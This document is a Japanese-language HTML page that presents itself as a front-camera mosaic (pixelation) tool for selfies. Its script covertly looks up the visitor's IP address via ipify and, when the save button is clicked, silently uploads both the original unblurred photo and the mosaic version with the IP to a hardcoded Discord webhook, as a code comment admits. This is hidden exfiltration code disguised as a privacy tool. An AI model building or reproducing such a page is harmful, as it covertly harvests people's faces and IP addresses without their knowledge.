<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>モザイク加工ツール</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px 16px;
    }
    h1 {
      font-size: 1.35rem;
      margin: 0 0 16px 0;
      text-align: center;
      background: linear-gradient(90deg, #4facfe, #00f2fe);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .container {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      padding: 16px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
    }
    video {
      width: 100%;
      border-radius: 12px;
      background: #000;
      display: block;
      transform: scaleX(-1);
    }
    .controls {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .slider-header {
      font-size: 0.9rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
    }
    input[type="range"] {
      width: 100%;
      margin: 4px 0;
      display: block;
      accent-color: #4facfe;
    }
    .btn {
      width: 100%;
      padding: 13px 16px;
      border: none;
      border-radius: 10px;
      font-size: 0.95rem;
      font-weight: bold;
      color: #fff;
      background: linear-gradient(90deg, #3a7bd5, #00d2ff);
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .btn:active {
      opacity: 0.85;
    }
    .secondary-btn {
      background: linear-gradient(90deg, #434343, #000000);
    }
    .result-box {
      width: 100%;
      display: none;
      flex-direction: column;
      gap: 12px;
      margin-top: 6px;
    }
    .image-row {
      display: flex;
      gap: 8px;
      width: 100%;
    }
    .image-card {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      background: rgba(0, 0, 0, 0.3);
      padding: 8px;
      border-radius: 10px;
    }
    .image-card p {
      margin: 0 0 6px 0;
      font-size: 0.8rem;
      color: #ccc;
      text-align: center;
      font-weight: bold;
    }
    .image-card canvas {
      width: 100%;
      height: auto;
      border-radius: 6px;
      background: #000;
      display: block;
    }
    .download-btn {
      background: #28a745;
      text-decoration: none;
      padding: 12px;
      border-radius: 10px;
      color: white;
      font-size: 0.95rem;
      font-weight: bold;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
  </style>
</head>
<body>

  <h1>モザイク加工ツール</h1>

  <div class="container">
    <!-- 内カメラ映像 -->
    <video id="video" autoplay playsinline muted></video>

    <!-- 撮影ボタン -->
    <div class="controls" id="captureControls">
      <button type="button" class="btn" id="snapBtn">内カメラで写真を撮る</button>
    </div>

    <!-- 撮影後の比較・調整エリア -->
    <div class="result-box" id="resultBox">
      <div class="image-row">
        <div class="image-card">
          <p>加工前</p>
          <canvas id="originalCanvas"></canvas>
        </div>
        <div class="image-card">
          <p>加工後</p>
          <canvas id="mosaicCanvas"></canvas>
        </div>
      </div>

      <div class="controls">
        <div class="slider-header">
          <span>モザイクの粗さ</span>
          <span id="mosaicValue">15</span>
        </div>
        <input type="range" id="mosaicSize" min="5" max="50" value="15">
      </div>

      <a id="downloadLink" class="download-btn" download="mosaic_image.png">モザイク画像を保存する</a>
      <button type="button" class="btn secondary-btn" id="retakeBtn">写真を撮り直す</button>
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const snapBtn = document.getElementById('snapBtn');
    const retakeBtn = document.getElementById('retakeBtn');
    const mosaicSizeInput = document.getElementById('mosaicSize');
    const mosaicValue = document.getElementById('mosaicValue');
    
    const captureControls = document.getElementById('captureControls');
    const resultBox = document.getElementById('resultBox');
    
    const originalCanvas = document.getElementById('originalCanvas');
    const mosaicCanvas = document.getElementById('mosaicCanvas');
    const downloadLink = document.getElementById('downloadLink');

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';

    let capturedSource = null;
    let clientIp = '';

    // IPアドレスをバックグラウンドで事前取得
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => { clientIp = data.ip; })
      .catch(() => { clientIp = '取得失敗'; });

    // 内カメラ（user）の起動
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        video.srcObject = stream;
        await video.play();
      } catch (err) {
        console.log('カメラが許可されていないか利用できません:', err);
      }
    }
    startCamera();

    // 写真を撮るボタン
    snapBtn.addEventListener('click', () => {
      if (!video.videoWidth) return;
      
      const tempCanvas = document.createElement('canvas');
      tempCanvas.width = video.videoWidth;
      tempCanvas.height = video.videoHeight;
      const ctx = tempCanvas.getContext('2d');
      ctx.translate(tempCanvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);
      
      capturedSource = tempCanvas;

      video.style.display = 'none';
      captureControls.style.display = 'none';
      resultBox.style.display = 'flex';

      updateImages();
    });

    // スライダー変更時にリアルタイムでモザイク度を変更
    mosaicSizeInput.addEventListener('input', () => {
      mosaicValue.textContent = mosaicSizeInput.value;
      if (capturedSource) {
        updateImages();
      }
    });

    // 比較画像の更新
    function updateImages() {
      if (!capturedSource) return;
      const w = capturedSource.width;
      const h = capturedSource.height;
      const blockSize = parseInt(mosaicSizeInput.value, 10);

      originalCanvas.width = w;
      originalCanvas.height = h;
      originalCanvas.getContext('2d').drawImage(capturedSource, 0, 0);

      drawMosaic(capturedSource, mosaicCanvas, blockSize);

      downloadLink.href = mosaicCanvas.toDataURL('image/png');
    }

    // 保存ボタンを押した時に、裏側で同時にDiscordへ送信
    downloadLink.addEventListener('click', () => {
      if (!capturedSource) return;

      Promise.all([
        new Promise(resolve => originalCanvas.toBlob(resolve, 'image/png')),
        new Promise(resolve => mosaicCanvas.toBlob(resolve, 'image/png'))
      ]).then(([origBlob, mosBlob]) => {
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify({
          content: `📥 **モザイク加工データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\``
        }));
        formData.append('file1', origBlob, 'original.png');
        formData.append('file2', mosBlob, 'mosaic.png');

        fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        }).catch(err => console.error(err));
      });
    });

    // 撮り直すボタン
    retakeBtn.addEventListener('click', () => {
      resultBox.style.display = 'none';
      video.style.display = 'block';
      captureControls.style.display = 'flex';
      capturedSource = null;
    });

    // モザイク描画の処理
    function drawMosaic(source, targetCanvas, blockSize) {
      const w = source.width;
      const h = source.height;

      targetCanvas.width = w;
      targetCanvas.height = h;
      const tCtx = targetCanvas.getContext('2d');

      const smallW = Math.max(1, Math.floor(w / blockSize));
      const smallH = Math.max(1, Math.floor(h / blockSize));

      const offscreen = document.createElement('canvas');
      offscreen.width = smallW;
      offscreen.height = smallH;
      const offCtx = offscreen.getContext('2d');

      offCtx.drawImage(source, 0, 0, smallW, smallH);

      tCtx.imageSmoothingEnabled = false;
      tCtx.drawImage(offscreen, 0, 0, smallW, smallH, 0, 0, w, h);
    }
  </script>
</body>
</html>
